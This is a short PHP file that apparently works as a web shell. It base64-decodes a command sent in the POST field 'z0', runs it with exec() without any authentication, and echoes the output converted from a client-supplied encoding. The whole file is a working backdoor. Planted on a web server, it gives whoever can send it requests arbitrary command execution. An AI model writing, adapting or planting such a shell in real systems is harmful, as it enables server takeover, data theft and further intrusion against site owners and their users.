<?php

$szCommand = base64_decode($_POST['z0']);
$szEncoding = base64_decode($_POST['z1']);

$aOutput = array();
$nRetVal = 0;

exec($szCommand, $aOutput, $nRetVal);

if (0 === $nRetVal)
{
    foreach ($aOutput as $szLine)
    {
        echo(mb_convert_encoding("$szLine\n", 'utf-8', $szEncoding));
    }
}
else
{
    echo("ret=$nRetVal");
}

?>